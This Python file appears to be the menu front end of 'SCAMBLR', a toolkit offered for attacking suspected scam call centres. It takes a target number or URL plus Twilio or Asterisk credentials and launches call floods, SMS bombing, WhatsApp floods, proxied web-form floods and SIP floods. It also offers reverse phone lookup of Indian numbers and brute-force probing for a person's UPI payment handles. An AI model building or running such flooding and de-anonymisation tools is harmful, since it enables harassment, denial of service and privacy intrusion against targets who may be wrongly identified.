"""SCAMBLR — interactive TUI for anti-scammer attacks."""
from __future__ import annotations

import os
import time

from .callflood import CallFlooder
from .smsbomb import SMSBomber
from .formflood import FormFlooder
from .whatsapp import WhatsAppFlooder
from .osint_india import IndianNumberOSINT
from .upi_probe import UPIProbe
from .voip_bomb import SIPFlooder

CYAN = "\033[1;36m"; GRAY = "\033[90m"; WHITE = "\033[97m"
GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"; RESET = "\033[0m"

BANNER = rf"""{RED}
 ███████╗ ██████╗ █████╗ ███╗   ███╗██████╗ ██╗     ██████╗
 ██╔════╝██╔════╝██╔══██╗████╗ ████║██╔══██╗██║     ██╔══██╗
 ███████╗██║     ███████║██╔████╔██║██████╔╝██║     ██████╔╝
 ╚════██║██║     ██╔══██║██║╚██╔╝██║██╔══██╗██║     ██╔══██╗
 ███████║╚██████╗██║  ██║██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
 ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
{RESET}{WHITE}Anti-Scam-Callcenter Attack Toolkit{RESET}
{GRAY}call · sms · form · whatsapp · osint · upi · sip{RESET}
"""


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def _ask(prompt: str) -> str:
    return input(f"{GRAY}{prompt}{RESET}").strip()


def menu_call_flood():
    tgt = _ask("scammer phone (+91...): ")
    sid = _ask("Twilio SID (blank to skip): ")
    tok = _ask("Twilio token: ")
    from_no = _ask("Twilio from number (+1...): ")
    secs = int(_ask("duration seconds [60]: ") or "60")
    twiml = _ask("Twilio TwiML URL: ")
    if not (tgt and sid and tok and from_no):
        print(f"{RED}[!] incomplete creds{RESET}"); return
    fl = CallFlooder(tgt)
    providers = [lambda: fl.twilio_call(sid, tok, from_no, twiml)]
    print(f"{CYAN}[*] flooding {tgt} for {secs}s via Twilio...{RESET}")
    print(fl.run(providers, workers=50, duration=secs))


def menu_sms_bomb():
    tgt = _ask("scammer phone (+91...): ")
    msg = _ask("message [Payment due — call back]: ") or "Payment due — call back"
    sid = _ask("Twilio SID (blank skip): ")
    tok = _ask("Twilio token: ")
    from_no = _ask("Twilio from number: ")
    secs = int(_ask("duration seconds [30]: ") or "30")
    if not tgt:
        print(f"{RED}[!] no target{RESET}"); return
    b = SMSBomber(tgt, msg)
    providers = []
    if sid and tok and from_no:
        providers.append(lambda: b.twilio_sms(sid, tok, from_no))
    if not providers:
        print(f"{RED}[!] no provider creds{RESET}"); return
    print(f"{CYAN}[*] sms-bombing {tgt} for {secs}s...{RESET}")
    print(b.run(providers, workers=20, duration=secs))


def menu_form_flood():
    url = _ask("scam form POST URL: ")
    secs = int(_ask("duration seconds [60]: ") or "60")
    proxy_file = _ask("proxy list file (blank for none): ")
    proxies = []
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file) as f:
            proxies = [line.strip() for line in f if line.strip()]
    if not url:
        print(f"{RED}[!] no url{RESET}"); return
    ff = FormFlooder(url, proxies=proxies)
    print(f"{CYAN}[*] flooding form {url} for {secs}s...{RESET}")
    print(ff.run(workers=30, duration=secs))


def menu_whatsapp():
    tgt = _ask("scammer whatsapp (+91...): ")
    sid = _ask("Twilio SID: ")
    tok = _ask("Twilio token: ")
    secs = int(_ask("duration seconds [30]: ") or "30")
    if not (tgt and sid and tok):
        print(f"{RED}[!] incomplete{RESET}"); return
    wf = WhatsAppFlooder(tgt)
    print(wf.run(sid, tok, workers=10, duration=secs))


def menu_osint():
    n = _ask("indian phone (+91...): ")
    rapid = _ask("RapidAPI key for TrueCaller (blank skip): ") or None
    try:
        report = IndianNumberOSINT(n).full_report(rapidapi_key=rapid)
    except ValueError as e:
        print(f"{RED}[!] {e}{RESET}"); return
    for k, v in report.items():
        print(f"{CYAN}{k}:{RESET} {v}")


def menu_upi():
    seed = _ask("seed name (scammer's name, lowercase) [random]: ") or None
    last4 = _ask("scammer phone last-4 [0000]: ") or "0000"
    proxy_file = _ask("proxy list file (blank none): ")
    proxies = []
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file) as f:
            proxies = [line.strip() for line in f if line.strip()]
    probe = UPIProbe(seed, proxies=proxies)
    print(f"{CYAN}[*] probing UPI handles...{RESET}")
    valid = probe.probe_handles(workers=10)
    valid += probe.brute_suffix(last4, workers=20)
    if valid:
        print(f"{GREEN}[+] valid VPAs:{RESET}")
        for v in set(valid):
            print(f"  {v}")
    else:
        print(f"{YELLOW}[*] no valid VPAs found{RESET}")


def menu_sip():
    tgt = _ask("target phone (+91...): ")
    host = _ask("Asterisk AMI host: ")
    user = _ask("AMI user [admin]: ") or "admin"
    sec = _ask("AMI secret [admin]: ") or "admin"
    trunk = _ask("trunk name [trunk]: ") or "trunk"
    secs = int(_ask("duration seconds [120]: ") or "120")
    if not (tgt and host):
        print(f"{RED}[!] missing{RESET}"); return
    sf = SIPFlooder(tgt, host, ami_user=user, ami_secret=sec, trunk=trunk)
    print(sf.run(workers=40, duration=secs))


def main():
    while True:
        clear()
        print(BANNER)
        print(f"{CYAN}╔══════════════════════════════════════════════════╗")
        print(f"║ {WHITE}SCAMBLR — ATTACK MENU{RESET} {CYAN}║")
        print(f"╠══════════════════════════════════════════════════╣")
        print(f"║ {GREEN}[1]{RESET} Call flood (Twilio / Vonage / Plivo)   {CYAN}║")
        print(f"║ {GREEN}[2]{RESET} SMS bomb (Twilio / Fast2SMS / AWS SNS) {CYAN}║")
        print(f"║ {GREEN}[3]{RESET} Form flood (contact page + proxies)    {CYAN}║")
        print(f"║ {GREEN}[4]{RESET} WhatsApp flood (Twilio WhatsApp)       {CYAN}║")
        print(f"║ {GREEN}[5]{RESET} OSINT reverse-lookup (TrueCaller etc)  {CYAN}║")
        print(f"║ {GREEN}[6]{RESET} UPI VPA probe (find scammer's handles) {CYAN}║")
        print(f"║ {GREEN}[7]{RESET} SIP flood (self-hosted Asterisk)       {CYAN}║")
        print(f"║ {GRAY}[Q]{RESET} Quit                                  {CYAN}║")
        print(f"╚══════════════════════════════════════════════════╝{RESET}")
        c = input(f"\n{GREEN}scamblr> {RESET}").strip().lower()
        if c == "1": menu_call_flood()
        elif c == "2": menu_sms_bomb()
        elif c == "3": menu_form_flood()
        elif c == "4": menu_whatsapp()
        elif c == "5": menu_osint()
        elif c == "6": menu_upi()
        elif c == "7": menu_sip()
        elif c in ("q", "exit"): break
        if c not in ("q", "exit"):
            input(f"\n{GRAY}press enter...{RESET}")


if __name__ == "__main__":
    main()
